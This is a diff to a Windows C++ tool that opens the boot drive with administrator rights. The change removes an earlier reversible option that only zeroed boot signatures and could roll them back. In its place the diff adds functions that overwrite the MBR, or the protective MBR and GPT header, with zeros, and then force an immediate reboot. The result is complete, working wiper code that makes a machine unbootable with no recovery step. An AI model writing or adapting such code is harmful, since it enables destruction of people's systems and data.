@@ -22,18 +22,7 @@ struct PartitionEntry
 
 static HANDLE hBootDrive = nullptr;
 
-void PrintBytes(const BYTE* buffer, DWORD bufferSize)
-{
-	for (DWORD i = 0; i < bufferSize; i++)
-	{
-		std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(buffer[i]) << " ";
-		if ((i + 1) % 16 == 0)
-			std::cout << std::endl;
-	}
-	std::cout << std::dec << std::endl;
-}
-
-std::wstring FormatErrorMessage(DWORD errorCode = GetLastError())
+std::wstring FormatErrorMessage(const DWORD errorCode = GetLastError())
 {
 	LPWSTR buffer = nullptr;
 	const DWORD result = FormatMessageW(
@@ -74,7 +63,7 @@ bool GetPhysicalDriveFromDriveLetter(const std::wstring& driveLetter, std::wstri
 	}
 
 	if (!DeviceIoControl(hVolume, IOCTL_STORAGE_GET_DEVICE_NUMBER, nullptr, 0, &storageDeviceNumber,
-		sizeof(storageDeviceNumber), &bytesReturned, nullptr))
+		sizeof storageDeviceNumber, &bytesReturned, nullptr))
 	{
 		std::wcout << L"Failed to retrieve device number for volume " << driveLetter << L". Error: " <<
 			FormatErrorMessage() << std::endl;
@@ -95,7 +84,7 @@ bool GetLBASectorSize(DWORD& sectorSize)
 	DISK_GEOMETRY_EX diskGeometry;
 
 	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &diskGeometry,
-		sizeof(diskGeometry), &bytesReturned, nullptr))
+		sizeof diskGeometry, &bytesReturned, nullptr))
 	{
 		std::wcout << L"Failed to retrieve drive geometry. Error: " << FormatErrorMessage() << std::endl;
 		return false;
@@ -132,7 +121,7 @@ bool GetBootDriveType(PartitionStyle& style)
 	DWORD bytesReturned = 0;
 	PARTITION_INFORMATION_EX partitionInfo;
 	if (!DeviceIoControl(hBootDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, nullptr, 0, &partitionInfo,
-		sizeof(partitionInfo), &bytesReturned, nullptr))
+		sizeof partitionInfo, &bytesReturned, nullptr))
 	{
 		std::wcout << L"Failed to retrieve the partition style. Error: " << FormatErrorMessage() << std::endl;
 		CloseHandle(hBootDrive);
@@ -140,33 +129,9 @@ bool GetBootDriveType(PartitionStyle& style)
 	}
 
 	// Check if the partition style indicates GPT
-	const bool isGPT = (partitionInfo.PartitionStyle == PARTITION_STYLE_GPT);
+	const bool isGPT = partitionInfo.PartitionStyle == PARTITION_STYLE_GPT;
 
 	style = isGPT ? PartitionStyle::Gpt : PartitionStyle::Mbr;
-	return true;
-}
-
-bool ReadMBR(BYTE buffer[512])
-{
-	DWORD bytesRead = 0;
-	if (!(ReadFile(hBootDrive, buffer, 512, &bytesRead, nullptr) && bytesRead == 512))
-	{
-		std::wcout << L"Failed to read MBR from boot drive. Error: " << FormatErrorMessage() << std::endl;
-		return false;
-	}
-
-	return true;
-}
-
-bool ReadGPT(BYTE* buffer, DWORD sectorSize)
-{
-	DWORD bytesRead = 0;
-	if (!(ReadFile(hBootDrive, buffer, sectorSize * 2, &bytesRead, nullptr) && bytesRead == sectorSize * 2))
-	{
-		std::wcout << L"Failed to read LBA 0 + 8 from boot drive. Error: " << FormatErrorMessage() << std::endl;
-		return false;
-	}
-
 	return true;
 }
 
@@ -178,7 +143,7 @@ BOOL IsElevated()
 	{
 		TOKEN_ELEVATION elevation;
 		DWORD cbSize = sizeof(TOKEN_ELEVATION);
-		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &cbSize))
+		if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof elevation, &cbSize))
 		{
 			fRet = elevation.TokenIsElevated > 0;
 		}
@@ -190,16 +155,9 @@ BOOL IsElevated()
 	return fRet;
 }
 
-bool WriteBootSignature(const unsigned char sig[2])
+bool DestroyMBR()
 {
-	unsigned char buffer[512];
-	if (!ReadMBR(buffer))
-	{
-		return false;
-	}
-
-	buffer[510] = sig[0];
-	buffer[511] = sig[1];
+	constexpr unsigned char buffer[512] = { 0 };
 
 	DWORD bytesWritten = 0;
 	if (!(WriteFile(hBootDrive, buffer, 512, &bytesWritten, nullptr) && bytesWritten == 512))
@@ -211,7 +169,7 @@ bool WriteBootSignature(const unsigned char sig[2])
 	return true;
 }
 
-bool WriteGPTSignature(const unsigned char sig[8])
+bool DestroyGPT()
 {
 	DWORD sectorSize;
 	if (!GetLBASectorSize(sectorSize))
@@ -219,14 +177,7 @@ bool WriteGPTSignature(const unsigned char sig[8])
 		return false;
 	}
 
-	const auto buffer = new unsigned char[sectorSize * 2];
-	if (!ReadGPT(buffer, sectorSize))
-	{
-		delete[] buffer;
-		return false;
-	}
-
-	memcpy(buffer + sectorSize, sig, 8);
+	const auto buffer = new unsigned char[sectorSize * 2] {0};
 
 	DWORD bytesWritten = 0;
 	if (!(WriteFile(hBootDrive, buffer, sectorSize * 2, &bytesWritten, nullptr) && bytesWritten == sectorSize * 2))
@@ -240,85 +191,106 @@ bool WriteGPTSignature(const unsigned char sig[8])
 	return true;
 }
 
-int wmain(int argc, const wchar_t* argv[])
+int Finalize(const int code, const bool key = true)
+{
+	if (hBootDrive != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(hBootDrive);
+	}
+
+	if (key)
+	{
+		std::wcout << L"Press any key to exit.";
+		std::wcin >> std::ws;
+	}
+
+	return code;
+}
+
+bool Reboot()
+{
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tkp;
+
+	// Get a token for this process. 
+
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+	{
+		std::wcout << L"Failed to open process token. Error: " << FormatErrorMessage() << std::endl;
+		return false;
+	}
+
+	// Get the LUID for the shutdown privilege. 
+	LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME,
+		&tkp.Privileges[0].Luid);
+
+	tkp.PrivilegeCount = 1;  // one privilege to set    
+	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	// Get the shutdown privilege for this process. 
+	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
+		nullptr, nullptr))
+	{
+		std::wcout << L"Failed to adjust token privileges. Error: " << FormatErrorMessage() << std::endl;
+		return false;
+	}
+
+	// Shut down the system and force all applications to close. 
+	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
+		SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_OTHER))
+	{
+		std::wcout << L"Failed to reboot. Error: " << FormatErrorMessage() << std::endl;
+		return false;
+	}
+
+	//shutdown was successful
+	return true;
+}
+
+int wmain(const int argc, const wchar_t* argv[])
 {
 	const std::vector<std::wstring> args(argv + 1, argv + argc);
 	if (!IsElevated())
 	{
-		std::wcout << L"Run as administrator" << std::endl;
-		system("pause");
-		return 1;
+		std::wcout << L"Run as administrator." << std::endl;
+		return Finalize(1);
 	}
 
 	if (!OpenBootDrive())
 	{
-		return 1;
+		return Finalize(2);
 	}
 
 	PartitionStyle style;
 	if (!GetBootDriveType(style))
 	{
-		goto exit_error;
+		return Finalize(3);
 	}
 
+	bool (*func)();
 	if (style == PartitionStyle::Gpt)
 	{
-		std::wcout << L"Detected GPT" << std::endl;
-
-		DWORD sectorSize;
-		if (!GetLBASectorSize(sectorSize))
-		{
-			goto exit_error;
-		}
-
-		unsigned char sig[8] = { 'E', 'F', 'I', ' ', 'P', 'A', 'R', 'T' };
-
-		if (argc > 1 && args[0] == L"--rollback-gpt-signature")
-		{
-			std::wcout << L"Rolling back GPT signature" << std::endl;
-		}
-		else
-		{
-			std::wcout << L"Destroying GPT signature" << std::endl;
-			memset(sig, 0, 8);
-		}
-
-		if (!WriteGPTSignature(sig))
-		{
-			goto exit_error;
-		}
+		std::wcout << L"Detected GPT, destroying..." << std::endl;
+		func = DestroyGPT;
 	}
 	else
 	{
-		std::wcout << L"Detected MBR" << std::endl;
-
-		unsigned char sig[2] = { 0x55, 0xAA };
-
-		if (argc > 1 && args[0] == L"--rollback-mbr-signature")
-		{
-			std::wcout << L"Rolling back MBR signature" << std::endl;
-		}
-		else
-		{
-			std::wcout << L"Destroying MBR signature" << std::endl;
-			sig[0] = 0;
-			sig[1] = 0;
-		}
-
-		if (!WriteBootSignature(sig))
-		{
-			goto exit_error;
-		}
+		std::wcout << L"Detected MBR, destroying..." << std::endl;
+		func = DestroyMBR;
 	}
 
-	std::wcout << L"Done" << std::endl;
-	CloseHandle(hBootDrive);
+	if (!func())
+	{
+		return Finalize(4);
+	}
+	
+	std::wcout << L"Done." << std::endl;
+	Finalize(0);
+	if (!Reboot())
+	{
+		return Finalize(5, false);
+	}
 
-	system("pause");
 	return 0;
-
-exit_error:
-	CloseHandle(hBootDrive);
-	system("pause");
-	return 1;
 }
